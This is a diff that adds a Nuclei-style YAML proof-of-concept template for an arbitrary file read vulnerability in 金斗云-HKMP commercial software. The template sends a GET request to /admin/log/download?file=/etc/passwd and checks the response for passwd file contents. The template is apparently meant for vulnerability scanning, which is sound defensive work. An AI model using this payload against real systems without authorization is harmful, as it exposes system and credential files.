@@ -1,0 +1,33 @@
+id: poc-yaml-kingtowin-download-anyfile-read
+info:
+  name: 金斗云-HKMP智慧商业软件 download 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件读取
+  description: |
+    金斗云-HKMP智慧商业软件存在任意文件读取漏洞，通过特定路径可以读取任意文件内容。
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/log/download?file=/etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "fileName=passwd"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
